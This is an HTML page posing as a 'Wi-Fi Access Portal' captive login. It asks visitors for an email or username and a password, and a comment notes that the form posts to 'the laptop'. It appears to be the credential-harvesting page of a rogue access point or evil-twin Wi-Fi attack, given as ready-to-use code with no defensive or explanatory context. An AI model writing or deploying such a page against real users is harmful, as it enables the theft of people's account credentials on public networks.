<!doctype html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Network Authentication Required</title>
    <style>
      body {
        font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
        background: #f4f4f9;
        display: flex;
        justify-content: center;
        align-items: center;
        height: 100vh;
        margin: 0;
      }
      .login-box {
        background: white;
        padding: 40px;
        border-radius: 12px;
        box-shadow: 0 10px 25px rgba(0, 0, 0, 0.1);
        width: 320px;
        text-align: center;
      }
      h2 {
        color: #333;
        margin-bottom: 10px;
      }
      p {
        color: #666;
        font-size: 14px;
        margin-bottom: 25px;
      }
      input {
        width: 100%;
        padding: 12px;
        margin: 8px 0;
        box-sizing: border-box;
        border: 1px solid #ddd;
        border-radius: 6px;
        font-size: 14px;
      }
      button {
        width: 100%;
        padding: 12px;
        background: #0056b3;
        color: white;
        border: none;
        border-radius: 6px;
        cursor: pointer;
        font-size: 16px;
        font-weight: bold;
        margin-top: 10px;
      }
      button:hover {
        background: #004494;
      }
    </style>
  </head>
  <body>
    <div class="login-box">
      <h2>Wi-Fi Access Portal</h2>
      <p>Please enter your network credentials to continue browsing.</p>
      <!-- The form sends a POST request to the laptop -->
      <form method="POST" action="/login">
        <input
          type="text"
          name="username"
          placeholder="Email or Username"
          required
        />
        <input
          type="password"
          name="password"
          placeholder="Password"
          required
        />
        <button type="submit">Connect to Network</button>
      </form>
    </div>
  </body>
</html>
